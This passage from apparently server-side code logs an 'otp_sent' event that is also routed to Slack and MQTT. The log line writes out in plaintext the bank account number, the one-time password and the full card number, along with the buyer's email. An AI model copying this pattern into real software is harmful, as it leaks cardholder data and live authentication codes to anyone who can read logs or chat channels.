      payload: auditPayload,
      dedupKey: auditDedupKey,
      correlationId,
    });
  });

  logger.info('sequoia/otp card: otp_sent enqueued (slack:dm + slack:#finance-otp + mqtt:audit)', {
    source: payload.source,
    bank,
    acc_no: accNo,
    otp,
    card_number: cardNumber,
    buyerEmail,
    correlationId,
  });
}
